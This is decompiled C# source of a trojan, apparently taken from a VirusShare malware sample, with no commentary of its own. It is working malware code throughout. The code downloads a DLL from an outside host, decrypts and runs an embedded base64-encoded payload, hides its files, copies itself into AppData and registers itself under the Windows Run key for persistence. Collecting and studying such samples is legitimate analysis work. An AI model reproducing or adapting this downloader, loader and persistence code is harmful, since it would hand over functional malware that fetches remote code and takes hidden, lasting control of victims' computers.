// Decompiled with JetBrains decompiler
// Type: hKPcZIVuuWerTnSqIiJUOg
// Assembly: servercrypted, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F2BEA6AB-1608-49FC-913F-B30CA0AEB321
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.MSIL.Pakes.ek-3aa7bb73213b566fe6501925efc49e102b643e64d320edfba21f5faccdc5ac53.exe

using GiGa;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Windows.Forms;

public class hKPcZIVuuWerTnSqIiJUOg
{
  private Archive GiGa;

  public hKPcZIVuuWerTnSqIiJUOg() => this.GiGa = new Archive();

  [STAThread]
  public static void Main()
  {
    string address = "http://h1.ripway.com/uudsapto/GiGa.dll";
    string destinationFileName = Application.StartupPath + "\\GiGa.dll";
    if (File.Exists("GiGa.dll"))
      File.Delete("GiGa.dll");
    MyProject.Computer.Network.DownloadFile(address, destinationFileName);
    File.SetAttributes("GiGa.dll", FileAttributes.Hidden);
    hKPcZIVuuWerTnSqIiJUOg.Cool();
    string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    string fileName = Path.GetFileName(Application.ExecutablePath);
    string location = Assembly.GetExecutingAssembly().Location;
    RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
    try
    {
      if (Operators.CompareString(Application.StartupPath, folderPath, false) == 0)
        return;
      if (File.Exists(folderPath + "\\" + fileName))
        File.Delete(folderPath + "\\" + fileName);
      FileSystem.FileCopy(Application.ExecutablePath, folderPath + "\\" + fileName);
      Interaction.Shell(folderPath + "\\" + fileName);
      FileAttributes fileAttributes = FileAttributes.Hidden;
      File.SetAttributes(folderPath + "\\" + fileName, fileAttributes);
      registryKey.SetValue(fileName, (object) (folderPath + "\\" + fileName), RegistryValueKind.String);
      ProjectData.EndApp();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void Cool() => Archive.PiL(Convert.FromBase64String(Stair.DeCrypt(Conversions.ToString(new ResourceManager("TC", Assembly.GetExecutingAssembly()).GetObject("PK")), "GiGa")));

  public static void AddStartup(string Name, string Path) => Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(Name, (object) Path, RegistryValueKind.String);
}
